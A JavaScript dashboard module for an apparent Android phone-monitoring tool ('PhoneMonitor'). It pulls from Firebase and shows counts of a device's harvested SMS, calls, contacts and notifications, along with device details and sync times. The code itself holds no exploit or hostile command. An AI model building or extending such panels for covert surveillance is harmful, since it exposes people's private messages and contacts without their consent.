/* ==========================================
   ServicesAndroid Dashboard
========================================== */

import { db, ref, onValue } from "../firebase.js";
import { CONFIG } from "../config.js";

export function showDashboard() {

    document.getElementById("pageTitle").textContent = "Dashboard";

    document.getElementById("content").innerHTML = `

    <div class="row g-4">

        <div class="col-lg-3 col-md-6">

            <div class="card p-4 text-center">

                <h6>SMS</h6>

                <h2 id="smsCount">0</h2>

            </div>

        </div>

        <div class="col-lg-3 col-md-6">

            <div class="card p-4 text-center">

                <h6>Calls</h6>

                <h2 id="callCount">0</h2>

            </div>

        </div>

        <div class="col-lg-3 col-md-6">

            <div class="card p-4 text-center">

                <h6>Contacts</h6>

                <h2 id="contactCount">0</h2>

            </div>

        </div>

        <div class="col-lg-3 col-md-6">

            <div class="card p-4 text-center">

                <h6>Notifications</h6>

                <h2 id="notificationCount">0</h2>

            </div>

        </div>

    </div>

    <div class="row mt-4">

        <div class="col-lg-6">

            <div class="card p-4">

                <h5>Device Status</h5>

                <h3 id="deviceStatus">

                    Connecting...

                </h3>

            </div>

        </div>

        <div class="col-lg-6">

            <div class="card p-4">

                <h5>Last Seen</h5>

                <h5 id="lastSeen">

                    --

                </h5>

            </div>

        </div>

    </div>

    <div class="row mt-4">

<div class="col-lg-6">

    <div class="card p-4">

        <h5>Device Information</h5>

        <hr>

        <table class="table table-borderless table-sm mb-0">

            <tr>
                <td><strong>📱 Device</strong></td>
                <td id="deviceName">--</td>
            </tr>

            <tr>
                <td><strong>🏭 Manufacturer</strong></td>
                <td id="manufacturer">--</td>
            </tr>

            <tr>
                <td><strong>🤖 Android</strong></td>
                <td id="androidVersion">--</td>
            </tr>

            <tr>
                <td><strong>🔋 Battery</strong></td>
                <td id="battery">--</td>
            </tr>

            <tr>
                <td><strong>🧠 RAM</strong></td>
                <td id="ram">--</td>
            </tr>

            <tr>
                <td><strong>💾 Storage</strong></td>
                <td id="storage">--</td>
            </tr>

        </table>

    </div>

</div>

    <div class="col-lg-6">

        <div class="card p-4">

            <h5>Last Sync Details</h5>

            <hr>

            <div class="mb-3">

                <strong>📩 SMS Sync</strong>

                <div id="lastSmsSync">--</div>

            </div>

            <div>

                <strong>📞 Call Sync</strong>

                <div id="lastCallSync">--</div>

            </div>

        </div>

    </div>

</div>

    `;

    loadDashboard();

}

function loadDashboard() {

    /* Device */

    onValue(ref(db, CONFIG.PATHS.DEVICE), snapshot => {

        if (!snapshot.exists()) return;

        const device = snapshot.val();

        document.getElementById("deviceStatus").textContent =
            device.status;

        document.getElementById("statusBadge").textContent =
            device.status;

        if (device.status === "Online") {

            document.getElementById("statusBadge").style.background =
                "#16A34A";

        } else {

            document.getElementById("statusBadge").style.background =
                "#DC2626";

        }

        if (device.lastSeen) {

            document.getElementById("lastSeen").textContent =
                new Date(device.lastSeen).toLocaleString();

        }

    /* Device Information */

onValue(ref(db, "PhoneMonitor/deviceInfo"), snapshot => {

    if (!snapshot.exists()) return;

    const info = snapshot.val();

    document.getElementById("deviceName").textContent =
        info.deviceName || "--";

    document.getElementById("manufacturer").textContent =
        info.manufacturer || "--";

    document.getElementById("androidVersion").textContent =
        info.androidVersion || "--";

    document.getElementById("battery").textContent =
        info.battery || "--";

    document.getElementById("ram").textContent =
        info.ram || "--";

    document.getElementById("storage").textContent =
        `${info.freeStorage || "--"} / ${info.totalStorage || "--"}`;

});


    });

    /* SMS */

    onValue(ref(db, CONFIG.PATHS.SMS), snapshot => {

        document.getElementById("smsCount").textContent =
            snapshot.exists() ? snapshot.size : 0;

    });

    /* Calls */

    onValue(ref(db, CONFIG.PATHS.CALLS), snapshot => {

        document.getElementById("callCount").textContent =
            snapshot.exists() ? snapshot.size : 0;

    });

    /* Contacts */

    onValue(ref(db, CONFIG.PATHS.CONTACTS), snapshot => {

        document.getElementById("contactCount").textContent =
            snapshot.exists() ? snapshot.size : 0;

    });

    /* Notifications */

    onValue(ref(db, CONFIG.PATHS.NOTIFICATIONS), snapshot => {

        document.getElementById("notificationCount").textContent =
            snapshot.exists() ? snapshot.size : 0;

    });

    /* Sync Details */

    onValue(ref(db, CONFIG.PATHS.SYNC), snapshot => {

    if (!snapshot.exists()) return;

    const sync = snapshot.val();

    document.getElementById("lastSmsSync").textContent =
        sync.lastSmsSync?.formatted || "--";

    document.getElementById("lastCallSync").textContent =
        sync.lastCallSync?.formatted || "--";

    });
   


}